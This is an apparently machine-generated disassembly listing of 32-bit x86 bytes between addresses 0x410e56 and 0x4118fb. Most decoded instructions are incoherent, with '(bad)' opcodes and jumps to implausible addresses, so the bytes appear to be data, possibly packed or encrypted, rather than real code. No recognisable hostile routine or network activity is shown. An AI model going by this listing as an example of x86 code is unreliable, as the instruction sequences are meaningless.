  410e56:	add    BYTE PTR [eax],al
  410e58:	retf   
  410e59:	sbb    BYTE PTR [ecx],ch
  410e5b:	xor    al,0x91
  410e5d:	dec    eax
  410e5e:	popa   
  410e5f:	aas    
  410e60:	call   FWORD PTR [edx-0x1e]
  410e63:	ret    
  410e64:	or     eax,0xba496a29
  410e69:	pop    ebx
  410e6a:	mov    ch,0x17
  410e6c:	mov    ebp,0xf203d8f0
  410e71:	bound  esp,QWORD PTR [edx+0x31]
  410e74:	dec    esi
  410e75:	cmc    
  410e76:	sub    eax,0x1e5b1906
  410e7b:	push   ecx
  410e7c:	inc    esi
  410e7d:	outs   dx,BYTE PTR ds:[esi]
  410e7e:	fwait
  410e7f:	mov    ecx,DWORD PTR [eax-0x18]
  410e82:	dec    esp
  410e83:	retf   
  410e84:	retf   0x915e
  410e87:	push   es
  410e88:	ds jle 0x410ec9
  410e8b:	fmul   st(6),st
  410e8d:	outs   dx,BYTE PTR ds:[esi]
  410e8e:	cmc    
  410e8f:	retf   0xe828
  410e92:	sub    al,0xdc
  410e94:	adc    ecx,DWORD PTR [edi]
  410e96:	jmp    0xb129279e
  410e9b:	fist   DWORD PTR [ebx]
  410e9d:	in     al,dx
  410e9e:	aad    0xca
  410ea0:	or     al,ch
  410ea2:	mov    eax,0xc5ec0bdb
  410ea7:	retf   0xa49b
  410eaa:	stos   BYTE PTR es:[edi],al
  410eab:	div    ecx
  410ead:	push   es
  410eae:	(bad)  
  410eaf:	xlat   BYTE PTR ds:[ebx]
  410eb0:	mov    esp,0x7a78a096
  410eb5:	outs   dx,DWORD PTR ds:[esi]
  410eb6:	cmp    BYTE PTR [edx+esi*1-0x6],bl
  410eba:	daa    
  410ebb:	add    al,0x0
	...
  410ee5:	add    BYTE PTR [eax+ebx*2+0x3],ah
  410ee9:	add    al,0x56
  410eeb:	push   edi
  410eec:	or     al,BYTE PTR [ebp+0x3e]
  410eef:	or     DWORD PTR [edx+0x645b3e28],0xffffffc3
  410ef6:	inc    eax
  410ef7:	jecxz  0x410ef8
  410ef9:	test   al,0x3d
  410efb:	pop    ebx
  410efc:	add    BYTE PTR [edx+0x6e],ah
  410eff:	outs   dx,DWORD PTR ds:[esi]
  410f00:	mov    bh,bl
  410f02:	push   ss
  410f03:	pop    ss
  410f04:	clc    
  410f05:	mov    ecx,0x56fbe684
  410f0a:	push   ebx
  410f0b:	dec    edi
  410f0c:	test   DWORD PTR [ecx],ebp
  410f0e:	test   ch,dl
  410f10:	popf   
  410f11:	jmp    0xbcc46a53
  410f16:	test   DWORD PTR [ebp+0xd],ebp
  410f19:	ins    DWORD PTR es:[edi],dx
  410f1a:	fldcw  WORD PTR [ebp-0x2]
  410f1d:	jmp    0xea15259e
  410f22:	cmp    eax,0xfe26005b
  410f27:	xchg   edx,eax
  410f28:	(bad)  
  410f29:	call   0xa5086a6b
  410f2e:	lea    esi,ds:0x943de900
  410f34:	inc    esp
  410f35:	sub    eax,0xe9005b3d
  410f3a:	test   al,0x7
  410f3c:	clc    
  410f3d:	bound  ebp,QWORD PTR [ebx]
  410f3f:	loopne 0x410f85
  410f41:	mov    ch,0x52
  410f43:	fiadd  WORD PTR [ecx+edi*4+0x4a]
  410f47:	add    DWORD PTR [ecx],eax
  410f49:	(bad)  
	...
  410f72:	add    BYTE PTR [eax],al
  410f74:	jns    0x410fe9
  410f76:	(bad)  
  410f77:	cmp    eax,DWORD PTR [esi]
  410f79:	(bad)  
  410f7a:	sar    BYTE PTR [esi+ebp*1],0xd8
  410f7e:	jl     0x410f2d
  410f80:	cmp    eax,0x816a4de6
  410f85:	xchg   edi,edi
  410f87:	xor    al,0x7c
  410f89:	add    esi,DWORD PTR [edx+ecx*1]
  410f8c:	jge    0x410fe9
  410f8e:	call   DWORD PTR [esi+ecx*4]
  410f91:	je     0x410f81
  410f93:	xor    al,0x42
  410f95:	pop    ebx
  410f96:	or     ebp,DWORD PTR [ecx+0x66616e]
  410f9c:	call   0x2e410ff8
  410fa1:	sub    al,0xc8
  410fa3:	jmp    0x410f3d
  410fa5:	fwait
  410fa6:	inc    ebx
  410fa7:	enter  0x5897,0x0
  410fab:	add    BYTE PTR [eax],ah
  410fad:	sbb    al,0xc8
  410faf:	jmp    FWORD PTR [edx-0x44]
  410fb2:	std    
  410fb3:	jne    0x410f54
  410fb5:	nop
  410fb6:	in     al,0xfd
  410fb8:	lock mov eax,ds:0x8f5b75fd
  410fbe:	cmp    BYTE PTR [ebp+0x67],bl
  410fc1:	pop    eax
  410fc2:	cmp    DWORD PTR [ebp+0x4f],0x57
  410fc6:	je     0x410fd0
  410fc8:	adc    BYTE PTR [eax+ebx*8],bl
  410fcb:	call   0x414543
  410fd0:	sub    al,0xf3
  410fd2:	mov    DWORD PTR [ebp+0x2f],edx
  410fd5:	out    dx,al
  410fd6:	adc    bh,bh
	...
  411000:	add    BYTE PTR [eax],al
  411002:	stos   BYTE PTR es:[edi],al
  411003:	mov    al,ds:0xef2f52fd
  411008:	push   ebx
  411009:	cld    
  41100a:	lods   al,BYTE PTR ds:[esi]
  41100b:	gs std 
  41100d:	jne    0x411042
  41100f:	mov    ds:0x955e0850,eax
  411014:	add    al,BYTE PTR [eax]
  411016:	pop    edx
  411017:	out    dx,al
  411018:	jmp    0x3283:0x5477db83
  41101f:	pop    ds
  411020:	arpl   WORD PTR [ecx+0x17],ax
  411023:	pop    eax
  411024:	jne    0x411044
  411026:	test   al,0x6c
  411028:	jbe    0x41108d
  41102a:	es push edi
  41102c:	add    DWORD PTR [eax],eax
  41102e:	xlat   BYTE PTR ds:[ebx]
  41102f:	push   edi
  411030:	mov    esi,0x18747c
  411035:	jmp    0x41101f
  411037:	stc    
  411038:	shl    BYTE PTR [esi],0xe5
  41103b:	(bad)  
  41103c:	les    eax,FWORD PTR [edx]
  41103e:	ds pop esp
  411040:	test   DWORD PTR ds:0x82d5473e,edi
  411046:	jnp    0x411096
  411048:	cmp    eax,0xf7823e41
  41104d:	and    DWORD PTR [ebp-0x42fffd7f],0xffffffbe
  411054:	xor    cl,BYTE PTR [ebx-0x1]
  411057:	add    DWORD PTR [edx],0x31bba0f
  41105d:	add    BYTE PTR [esi],bh
  41105f:	add    DWORD PTR [esi],eax
  411061:	mov    ch,dh
  411063:	ret    0x2
	...
  41108e:	add    BYTE PTR [eax],al
  411090:	dec    ecx
  411091:	(bad)  
  411092:	loope  0x411093
  411094:	jno    0x411017
  411096:	mov    edi,0x2816a44
  41109b:	add    BYTE PTR [esi],bh
  41109d:	xor    eax,0x823ef83e
  4110a2:	add    al,BYTE PTR [eax]
  4110a4:	ret    
  4110a5:	mov    dh,0xc6
  4110a7:	dec    edi
  4110a8:	mov    ebx,0xd44fcabe
  4110ad:	sbb    DWORD PTR [edx-0x3a],0xff02b39d
  4110b4:	dec    ebx
  4110b5:	les    edi,FWORD PTR [ebx]
  4110b7:	inc    ecx
  4110b8:	ds jge 0x41107d
  4110bb:	push   cs
  4110bc:	mov    edx,0x3e000332
  4110c1:	cmc    
  4110c2:	dec    eax
  4110c3:	clc    
  4110c4:	ds jns 0x411145
  4110c7:	stos   DWORD PTR es:[edi],eax
  4110c8:	ds je  0x4110cd
  4110cb:	add    DWORD PTR [ebx-0x3df0fc68],0xffffffd6
  4110d2:	add    eax,DWORD PTR [eax]
  4110d4:	ds in  eax,dx
  4110d6:	push   eax
  4110d7:	cld    
  4110d8:	xlat   BYTE PTR ds:[ebx]
  4110d9:	test   BYTE PTR [ebx],0x0
  4110dc:	ds push edx
  4110de:	jnp    0x411115
  4110e0:	fstp   DWORD PTR [ebx+0x1f]
  4110e3:	in     al,dx
  4110e4:	shl    BYTE PTR [eax],0x99
  4110e7:	(bad)  
  4110e8:	push   ebx
  4110e9:	inc    edi
  4110ea:	inc    cx
  4110ec:	retf   0xcf3
  4110ef:	arpl   di,di
  4110f1:	pop    edx
  4110f2:	xchg   ecx,eax
  4110f3:	in     eax,dx
	...
  41111c:	add    BYTE PTR [eax],al
  41111e:	adc    eax,0x89b4e95b
  411123:	fisubr WORD PTR [eax-0x76df48fe]
  411129:	pop    esp
  41112a:	sbb    bh,dh
  41112c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41112d:	add    eax,ecx
  41112f:	and    BYTE PTR [ebp-0x41],al
  411132:	add    dh,BYTE PTR [edi-0x18]
  411135:	add    edi,DWORD PTR [esi]
  411137:	pop    ebx
  411138:	pop    esp
  411139:	inc    ecx
  41113a:	or     dx,bx
  41113d:	add    al,0xe4
  41113f:	pop    edx
  411140:	rol    DWORD PTR [ebx],cl
  411142:	mov    ebx,0xd4344920
  411147:	pop    edx
  411148:	pop    esp
  411149:	inc    ecx
  41114a:	dec    esi
  41114b:	or     esp,DWORD PTR [esi]
  41114d:	icebp  
  41114e:	mov    ecx,0x3503a816
  411153:	fwait
  411154:	pushf  
  411155:	sbb    BYTE PTR [ebp-0x4dfc0318],bh
  41115b:	inc    edx
  41115c:	inc    ecx
  41115d:	add    eax,0xfae95b3e
  411162:	jmp    0xab07f055
  411167:	push   ebx
  411168:	out    dx,al
  411169:	push   eax
  41116a:	es push 0x5b
  41116d:	fcom   DWORD PTR [eax]
  41116f:	icebp  
  411170:	lock pop ebx
  411172:	inc    edx
  411173:	pop    ebx
  411174:	mov    BYTE PTR [ebp-0x392d4fe7],0xf8
  41117b:	imul   edi,DWORD PTR [ebx],0x2283d9d8
  411181:	add    al,0x0
	...
  4111ab:	add    BYTE PTR [esi],bh
  4111ad:	or     DWORD PTR [eax],eax
  4111af:	mov    dh,0x26
  4111b1:	arpl   WORD PTR [edx+0x7cdcd9a7],ax
  4111b7:	mov    eax,ds:0x6a08ef3d
  4111bc:	inc    ebx
  4111bd:	pop    ebx
  4111be:	(bad)  
  4111c0:	push   0x808efe6a
  4111c5:	out    dx,al
  4111c6:	sti    
  4111c7:	xchg   BYTE PTR [esi+0x42284b0d],ch
  4111cd:	or     ecx,ecx
  4111cf:	stos   DWORD PTR es:[edi],eax
  4111d0:	mov    eax,ds:0x71625369
  4111d5:	fadd   st(3),st
  4111d7:	popa   
  4111d8:	neg    DWORD PTR [edx+0x6a]
  4111db:	push   cs
  4111dc:	sub    esi,0xf56c4107
  4111e2:	dec    BYTE PTR [esi-0x6]
  4111e5:	push   ds
  4111e6:	cld    
  4111e7:	push   0x46
  4111e9:	mov    ebx,0x5b3da84a
  4111ee:	je     0x4111e6
  4111f0:	mov    al,ds:0x3de9f81e
  4111f5:	pop    ebx
  4111f6:	add    dl,dl
  4111f8:	jge    0x411213
  4111fa:	push   eax
  4111fb:	mov    ecx,0xbbf80ec6
  411200:	js     0x411250
  411202:	mov    al,ds:0x855b82a2
  411207:	sub    DWORD PTR [edx-0x433514a3],eax
  41120d:	out    0xf7,eax
  41120f:	jmp    0x411214
	...
  411238:	add    BYTE PTR [eax],al
  41123a:	mov    ds,WORD PTR [ebp-0x15]
  41123d:	shl    BYTE PTR [ebp-0x36],cl
  411240:	mov    ds:0x74683a29,al
  411245:	loope  0x41124a
  411247:	lock pop es
  411249:	shr    DWORD PTR [edi+0x62],0xfe
  41124d:	into   
  41124e:	ja     0x41125f
  411250:	clc    
  411251:	add    BYTE PTR [ebp+ebp*2-0x3],ch
  411255:	jne    0x411256
  411257:	sahf   
  411258:	push   eax
  411259:	or     BYTE PTR [eax+0x10e80818],ch
  41125f:	mov    al,ds:0x1898fffd
  411264:	or     al,ch
  411266:	jg     0x411209
  411268:	std    
  411269:	jmp    FWORD PTR [eax+0x52fffc18]
  41126f:	addr16 out 0xd3,al
  411272:	dec    ebx
  411273:	sahf   
  411274:	std    
  411275:	leave  
  411276:	aad    0x5b
  411278:	add    BYTE PTR [ebp+0x1c],dl
  41127b:	add    DWORD PTR [ecx+0x573917c4],0x53
  411282:	or     al,0x38
  411284:	or     al,0xc7
  411286:	xchg   ebp,eax
  411287:	pop    esp
  411288:	add    BYTE PTR [eax],al
  41128a:	xchg   edi,eax
  41128b:	lahf   
  41128c:	jae    0x411296
  41128e:	jmp    FWORD PTR [edi+0x58]
  411291:	add    BYTE PTR [edi-0x25],ah
  411294:	test   BYTE PTR [ecx],0xb0
  411297:	gs sub eax,eax
  41129a:	int3   
  41129b:	aas    
  41129c:	pop    esi
  41129d:	leave  
	...
  4112c6:	add    BYTE PTR [eax],al
  4112c8:	and    eax,0x2fd0fe67
  4112cd:	loop   0x411322
  4112cf:	or     al,0xce
  4112d1:	pop    esp
  4112d2:	mov    ebx,eax
  4112d4:	pop    eax
  4112d5:	fcmovu st,st(0)
  4112d7:	add    BYTE PTR [edi],ah
  4112d9:	pop    esp
  4112da:	mov    esi,DWORD PTR [ebp+0x2f]
  4112dd:	jecxz  0x41135a
  4112df:	or     BYTE PTR [ebp+esi*1+0x66],cl
  4112e3:	mov    edx,DWORD PTR [ecx]
  4112e5:	fdiv   st(2),st
  4112e7:	xor    BYTE PTR [ebp+0x5efc7e62],dl
  4112ed:	push   ss
  4112ee:	add    eax,0xeb4bfb80
  4112f3:	sbb    edi,DWORD PTR [esi]
  4112f5:	repnz mov BYTE PTR [eax+0x6c],0x87
  4112fa:	cmp    bl,0x78
  4112fd:	sub    esp,edi
  4112ff:	jg     0x4112db
  411301:	xor    al,BYTE PTR [ebx+eax*8+0x2af99d34]
  411308:	dec    BYTE PTR [ebp+eiz*1+0x5e]
  41130c:	pop    es
  41130d:	mov    ah,0xfa
  41130f:	inc    DWORD PTR ds:0x2085082
  411315:	mov    ecx,DWORD PTR [ebx+0x4]
  411318:	push   0xffffff82
  41131a:	xlat   BYTE PTR ds:[ebx]
  41131b:	push   ss
  41131c:	jb     0x411351
  41131e:	push   edx
  41131f:	or     ch,BYTE PTR [edx+0x40]
  411322:	dec    ebp
  411323:	push   es
  411324:	push   edx
  411325:	xor    eax,DWORD PTR [eax]
  411327:	or     ah,BYTE PTR [ebp+0xc0177a]
	...
  411355:	add    ch,dh
  411357:	mov    al,ds:0x697cc924
  41135c:	add    al,al
  41135e:	sahf   
  41135f:	jne    0x411359
  411361:	ret    
  411362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411363:	mov    esp,0x6d3cc57f
  411368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411369:	je     0x411307
  41136b:	in     al,dx
  41136c:	cmp    eax,0x7361610c
  411371:	inc    esp
  411372:	push   esi
  411373:	cmp    BYTE PTR [esi+0x8],cl
  411376:	shl    DWORD PTR [esi+0x4e03c6c6],0x3
  41137d:	add    BYTE PTR [esi],bh
  41137f:	jb     0x411400
  411381:	cmp    al,0xc6
  411383:	mov    ecx,0xe83e0041
  411388:	sub    al,0x8d
  41138a:	and    DWORD PTR [ecx+esi*1+0x6a],0x3f
  41138f:	fiadd  DWORD PTR [edx]
  411391:	push   0x3e
  411393:	fiadd  DWORD PTR [edx]
  411395:	push   0x3e
  411397:	pop    ebx
  411398:	je     0x4113e3
  41139a:	push   es
  41139b:	or     al,0xde
  41139d:	sbb    DWORD PTR [esi+0x45042812],esi
  4113a3:	fwait
  4113a4:	push   esp
  4113a5:	(bad)  
  4113a6:	mov    esp,0x7204bce8
  4113ab:	das    
  4113ac:	jb     0x4113f7
  4113ae:	xor    dl,dl
  4113b0:	and    esi,DWORD PTR [esp+edx*1-0x2a11c9ad]
  4113b7:	rcr    BYTE PTR [ebx],cl
  4113b9:	mov    eax,0x0
	...
  4113e2:	add    BYTE PTR [eax],al
  4113e4:	mov    ah,0xe8
  4113e6:	lock mov ?,WORD PTR [edx+0x6b]
  4113ea:	mov    DWORD PTR [esi],eax
  4113ec:	lods   eax,DWORD PTR ds:[esi]
  4113ed:	mov    edi,0x66424961
  4113f2:	sti    
  4113f3:	mov    bl,0xb8
  4113f5:	pop    ebx
  4113f6:	jle    0x411431
  4113f8:	stos   BYTE PTR es:[edi],al
  4113f9:	jae    0x4113b7
  4113fb:	pop    esp
  4113fc:	ds pop ebx
  4113fe:	xor    DWORD PTR ds:0x5ee95b3e,eax
  411404:	jmp    0x3a07440d
  411409:	pop    ebx
  41140a:	add    al,ah
  41140c:	adc    al,0x6
  41140e:	scas   eax,DWORD PTR es:[edi]
  41140f:	int3   
  411410:	jg     0x411465
  411412:	jmp    0x69b8c96f
  411417:	enter  0xf3a1,0xe8
  41141b:	jecxz  0x411476
  41141d:	inc    ax
  41141f:	add    ah,al
  411421:	gs and eax,0x9067028d
  411427:	add    ebx,DWORD PTR [esi]
  411429:	pop    ebx
  41142a:	jmp    0xe3682da
  41142f:	ret    
  411430:	(bad)  
  411431:	pop    ds
  411432:	add    DWORD PTR [esi+edi*1],ebp
  411435:	cmp    ebp,ecx
  411437:	add    edx,DWORD PTR [esi]
  411439:	aas    
  41143a:	add    BYTE PTR [edi-0x5b779b04],al
  411440:	leave  
  411441:	std    
  411442:	dec    DWORD PTR [eax]
  411444:	inc    edx
  411445:	pop    ebx
  411446:	call   0x411541
	...
  41146f:	add    BYTE PTR [eax],al
  411471:	add    BYTE PTR [edi+0x66],cl
  411474:	(bad)  
  411475:	pusha  
  411476:	xchg   BYTE PTR [ebx+0x67],ch
  411479:	jmp    0xd23f7a5b
  41147e:	cmp    esi,ebp
  411480:	(bad)  
  411481:	mov    esi,0x41ec1eb2
  411486:	inc    edx
  411487:	cmp    eax,DWORD PTR [eax]
  411489:	jmp    0xa6ad7b33
  41148e:	cld    
  41148f:	rol    BYTE PTR [ecx+edx*4+0x15],cl
  411493:	pop    ebx
  411494:	and    cl,ch
  411496:	cmp    eax,0x7cfcef73
  41149b:	mov    BYTE PTR fs:[esi+edx*8],ch
  41149f:	fs je  0x41147b
  4114a2:	push   ebp
  4114a3:	pop    edx
  4114a4:	sub    BYTE PTR fs:[edx+0x66],al
  4114a8:	je     0x411517
  4114aa:	in     eax,0x85
  4114ac:	pop    eax
  4114ad:	jmp    0xee04eeef
  4114b2:	jl     0x4114a2
  4114b4:	xadd   DWORD PTR [edi-0x1],edx
  4114b8:	inc    eax
  4114b9:	jmp    0x5239033a
  4114be:	mov    es,WORD PTR [edx]
  4114c0:	add    cl,ch
  4114c2:	mov    eax,0x16360b99
  4114c7:	dec    ebx
  4114c8:	push   0x1c2602
  4114cd:	es push es
  4114cf:	outs   dx,DWORD PTR ds:[esi]
  4114d0:	out    0x63,eax
  4114d2:	loop   0x41152e
  4114d4:	add    BYTE PTR [edx+0x0],ch
	...
  4114ff:	add    BYTE PTR [ecx],al
  411501:	push   ecx
  411502:	call   DWORD PTR [ebp+ecx*2-0x44ffb60d]
  411509:	pop    ds
  41150a:	add    bh,bh
  41150c:	stos   BYTE PTR es:[edi],al
  41150d:	test   al,0xe6
  41150f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411510:	scas   al,BYTE PTR es:[edi]
  411511:	pop    eax
  411512:	add    BYTE PTR [ebx+0x75ff545b],al
  411518:	pop    es
  411519:	xor    DWORD PTR [ebp+0x64],ebx
  41151c:	push   esi
  41151d:	pop    edi
  41151e:	push   DWORD PTR [ebp+0x3]
  411521:	mov    eax,0x58e75992
  411526:	add    esp,0xfffffff3
  411529:	fwait
  41152a:	jae    0x411538
  41152c:	(bad)  
  41152d:	cs fs inc ecx
  411530:	out    0x9b,eax
  411532:	jae    0x41151c
  411534:	(bad)  
  411535:	fcom   DWORD PTR [edi+0x0]
  411538:	xlat   BYTE PTR ds:[ebx]
  411539:	ffreep st(2)
  41153b:	or     al,0xa0
  41153d:	sub    al,0x10
  41153f:	push   0x413350
  411544:	shr    BYTE PTR [esp+eiz*8],0xe8
  411548:	push   ecx
  411549:	add    BYTE PTR [eax],al
  41154b:	add    BYTE PTR [ebx+edx*4],dl
  41154e:	or     ch,BYTE PTR [edx-0x59]
  411551:	fwait
  411552:	jae    0x411550
  411554:	and    BYTE PTR [esp+ecx*1],ch
  411557:	jmp    FWORD PTR [edx]
  411559:	jmp    0xb0d856a4
  41155e:	push   esp
  41155f:	jo     0x411571
  411561:	call   0x0:0x4587
	...
  41158c:	add    BYTE PTR [eax],al
  41158e:	pop    es
  41158f:	xor    eax,0xa0aaff00
  411594:	std    
  411595:	jne    0x4115ea
  411597:	fwait
  411598:	xor    ebp,DWORD PTR [esi-0x17ffe661]
  41159e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41159f:	sub    bh,bh
  4115a1:	dec    esi
  4115a3:	sbb    ebx,esp
  4115a5:	push   0x57
  4115a7:	fwait
  4115a8:	jae    0x41159e
  4115aa:	ds dec ebp
  4115ac:	aaa    
  4115ad:	or     al,0x31
  4115af:	(bad)  
  4115b0:	jo     0x4115f9
  4115b2:	jg     0x411626
  4115b4:	stos   BYTE PTR es:[edi],al
  4115b5:	sub    DWORD PTR [esi-0x7c77409b],ebp
  4115bb:	dec    edx
  4115bc:	add    BYTE PTR cs:[ecx],dl
  4115bf:	out    dx,eax
  4115c0:	mov    dl,0xfe
  4115c2:	xchg   ebx,eax
  4115c3:	mov    bh,BYTE PTR [edi+0x4329d034]
  4115c9:	add    dh,ah
  4115cb:	gs xor bh,bh
  4115ce:	icebp  
  4115cf:	cli    
  4115d0:	inc    ebp
  4115d1:	aam    0x54
  4115d3:	jb     0x411594
  4115d5:	je     0x4115a9
  4115d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d8:	xor    eax,0x7066d9e8
  4115dd:	inc    edi
  4115de:	jg     0x411652
  4115e0:	stos   BYTE PTR es:[edi],al
  4115e1:	std    
  4115e2:	pop    ecx
  4115e3:	mov    ebp,0xa27b88bf
  4115e8:	lea    eax,[esi+edi*2+0x21]
  4115ec:	shl    DWORD PTR [edx+ebx*4-0x2c],0x35
  4115f1:	or     al,0x0
	...
  41161b:	add    BYTE PTR [ecx-0xb88f5a],ch
  411621:	jno    0x4115cd
  411623:	in     eax,0x29
  411625:	in     eax,dx
  411626:	mov    edi,0x83c5fb88
  41162b:	jl     0x4115cb
  41162d:	jno    0x41163e
  41162f:	test   cl,cl
  411631:	jno    0x411635
  411633:	add    BYTE PTR [ebp+0x40ffd68e],bh
  411639:	(bad)  
  41163a:	ins    DWORD PTR es:[edi],dx
  41163b:	jmp    FWORD PTR [ecx+0x71]
  41163e:	cmp    DWORD PTR [esi+ecx*4+0x71],0xf
  411643:	test   BYTE PTR [ebp-0x3cfffd8f],bl
  411649:	mov    esi,0x5a494fc6
  41164e:	pushf  
  41164f:	xlat   BYTE PTR ds:[ebx]
  411650:	pop    ecx
  411651:	or     bl,BYTE PTR [eax+eax*8]
  411654:	cmp    BYTE PTR [edi+0x29],dl
  411657:	adc    BYTE PTR [edx+0x3e03e8d2],bh
  41165d:	fiadd  WORD PTR [ebx+0x655221c7]
  411663:	xchg   BYTE PTR [ecx],bl
  411665:	arpl   ax,bp
  411667:	mov    ?,WORD PTR [edx-0x6d]
  41166a:	cwde   
  41166b:	rcl    BYTE PTR [edx+0x2f2d08b],0x63
  411672:	fisttp QWORD PTR [ebx]
  411674:	(bad)  
  411675:	out    0x5b,eax
  411677:	xor    DWORD PTR [edx-0x6d],0xffffffe8
  41167b:	aaa    
  41167c:	pop    ecx
  41167d:	repz fadd DWORD PTR [ebx]
	...
  4116a8:	add    BYTE PTR [eax],al
  4116aa:	shl    DWORD PTR [ecx+0x734639bd],1
  4116b0:	shr    DWORD PTR [ecx+edx*8],cl
  4116b3:	bound  ebp,QWORD PTR [ebp+0x1b62de39]
  4116b9:	or     al,0xd6
  4116bb:	out    0xf,eax
  4116bd:	mov    edi,0xe01b62b8
  4116c2:	mov    al,0xe8
  4116c4:	loopne 0x411671
  4116c6:	push   ss
  4116c7:	hlt    
  4116c8:	test   DWORD PTR [edi-0x405f1760],edi
  4116ce:	adc    dl,BYTE PTR [ebx-0x7f]
  4116d1:	pop    esi
  4116d2:	daa    
  4116d3:	bound  ebp,QWORD PTR [ebp-0x41]
  4116d6:	adc    dl,BYTE PTR [edi+0x626a3965]
  4116dc:	ror    DWORD PTR [ebx],cl
  4116de:	data16 aaa 
  4116e0:	sar    BYTE PTR [esi-0x342c9d90],0x68
  4116e7:	call   0x532bd604
  4116ec:	push   ecx
  4116ed:	push   ss
  4116ee:	out    0x61,eax
  4116f0:	push   DWORD PTR ds:0xe9cbdfbd
  4116f6:	adc    DWORD PTR [eax-0x7d],ecx
  4116f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116fa:	jge    0x41175a
  4116fc:	jne    0x4116ec
  4116fe:	les    edx,FWORD PTR [esi]
  411700:	int3   
  411701:	push   ss
  411702:	sub    ah,BYTE PTR [ecx+0x74]
  411705:	loope  0x4116dc
  411707:	cwde   
  411708:	addr16 push es
  41170a:	loope  0x411780
  41170c:	or     DWORD PTR [ebx+0x0],edx
	...
  411736:	add    BYTE PTR [eax],al
  411738:	cmp    eax,0xe5e17462
  41173d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41173e:	addr16 out dx,al
  411740:	enter  0x7460,0xe5
  411744:	aad    0x5b
  411746:	ins    BYTE PTR es:[edi],dx
  411747:	fidivr WORD PTR [eax-0x5a2e8ba0]
  41174d:	arpl   WORD PTR [edx-0x32],bp
  411750:	test   al,0x60
  411752:	je     0x411711
  411754:	xchg   ebp,eax
  411755:	imul   ebp,DWORD PTR [edx-0x42],0xffffff98
  411759:	pusha  
  41175a:	je     0x411715
  41175c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41175d:	jae    0x4117c9
  41175f:	scas   al,BYTE PTR es:[edi]
  411760:	mov    BYTE PTR [eax+0x74],ah
  411763:	xchg   ebp,eax
  411764:	xchg   ebp,eax
  411765:	jnp    0x4117d1
  411767:	sahf   
  411768:	clc    
  411769:	pusha  
  41176a:	je     0x4116ed
  41176c:	in     eax,0x83
  41176e:	push   0xffffff8e
  411770:	call   0xd5ce8bd5
  411775:	mov    ebp,DWORD PTR [edx+0x7e]
  411778:	fsub   DWORD PTR [eax+0x74]
  41177b:	mov    ebp,esp
  41177d:	xchg   ebx,eax
  41177e:	push   0x6e
  411780:	enter  0x7460,0x45
  411784:	aad    0x9b
  411786:	push   0x5e
  411788:	mov    eax,0xa5317460
  41178d:	mov    ds:0x60a84e6a,eax
  411792:	je     0x411794
  411794:	inc    ebx
  411795:	mov    dh,0xb0
  411797:	imul   ebx,DWORD PTR [eax],0xffffffa1
  41179a:	std    
  41179b:	jne    0x41179d
	...
  4117c5:	add    BYTE PTR [edi],dh
  4117c7:	mov    dh,0xa8
  4117c9:	imul   ebx,DWORD PTR [eax],0xffffffa1
  4117cc:	std    
  4117cd:	jne    0x4117da
  4117cf:	mov    dh,0xa0
  4117d1:	imul   ebx,DWORD PTR [eax-0x5f],0xffffffc7
  4117d5:	ret    0x5d1b
  4117d8:	push   ebp
  4117d9:	mov    ebp,DWORD PTR [ebx]
  4117db:	ffree  st(2)
  4117dd:	call   0x8e3eb702
  4117e2:	loop   0x411784
  4117e4:	dec    esi
  4117e5:	call   DWORD PTR [edx+0x4935ff50]
  4117eb:	adc    al,0x41
  4117ed:	add    bh,ch
  4117ef:	call   0x54281849
  4117f4:	ror    BYTE PTR [edi],0x62
  4117f7:	inc    ebx
  4117f8:	add    DWORD PTR [eax],eax
  4117fa:	xlat   BYTE PTR ds:[ebx]
  4117fb:	xchg   edi,eax
  4117fc:	inc    ebx
  4117fd:	clc    
  4117fe:	xlat   BYTE PTR ds:[ebx]
  4117ff:	pop    esp
  411800:	add    BYTE PTR [eax],al
  411802:	mov    al,ds:0xe0fff418
  411807:	pop    esp
  411808:	add    BYTE PTR [edx-0x29],ch
  41180b:	xor    al,BYTE PTR [eax]
  41180d:	push   0xffffffd7
  41180f:	xor    al,BYTE PTR [eax]
  411811:	lea    esp,[edx-0x5d]
  411814:	dec    esi
  411815:	lea    esp,[edx]
  411817:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411818:	cmc    
  411819:	(bad)  
  41181a:	mov    eax,0xbf75ff07
  41181f:	sahf   
  411820:	jae    0x41181e
  411822:	scas   eax,DWORD PTR es:[edi]
  411823:	(bad)  
  411824:	push   ebp
  411825:	add    BYTE PTR [edi+0x74c053],ah
	...
  411853:	add    BYTE PTR [edx-0x68ff2a4b],ah
  411859:	pop    esp
  41185a:	push   0x1daf8a
  41185f:	(bad)  
  411860:	ds jg  0x411871
  411863:	call   0xfefcb8ee
  411868:	push   cs
  411869:	in     eax,dx
  41186a:	ror    DWORD PTR [ebx+eax*8+0x51feb522],cl
  411871:	ret    0xe850
  411874:	jbe    0x411816
  411876:	mov    ebx,0xabefb7fe
  41187b:	idiv   BYTE PTR [ecx]
  41187d:	inc    ecx
  41187e:	lods   al,BYTE PTR ds:[esi]
  41187f:	sbb    eax,0x8cbd49a5
  411884:	add    DWORD PTR [edx+0x54],0x68
  411888:	sub    ebp,edx
  41188a:	inc    ecx
  41188b:	add    BYTE PTR [ecx],bl
  41188d:	daa    
  41188e:	lods   al,BYTE PTR ds:[esi]
  41188f:	not    BYTE PTR [ecx]
  411891:	imul   edi,DWORD PTR [ebx+0x41b9d834],0x2e561600
  41189b:	(bad)  
  41189c:	stc    
  41189d:	jmp    0x82bb:0x88e9eb85
  4118a4:	stos   DWORD PTR es:[edi],eax
  4118a5:	popf   
  4118a6:	mov    bl,0xfe
  4118a8:	loope  0x41191b
  4118aa:	ss pop edx
  4118ac:	mov    ebp,0x4b03b41e
  4118b1:	cmp    ecx,DWORD PTR [ecx-0x4457257c]
  4118b7:	inc    BYTE PTR [eax]
	...
  4118e1:	add    cl,al
  4118e3:	or     DWORD PTR [ebx-0x4437557c],0xaf06bffe
  4118ed:	imul   BYTE PTR [ecx+0x3e02aad0]
  4118f3:	jb     0x411929
  4118f5:	or     al,BYTE PTR [ecx-0x6e09510a]
  4118fb:	call   0x727f1baa
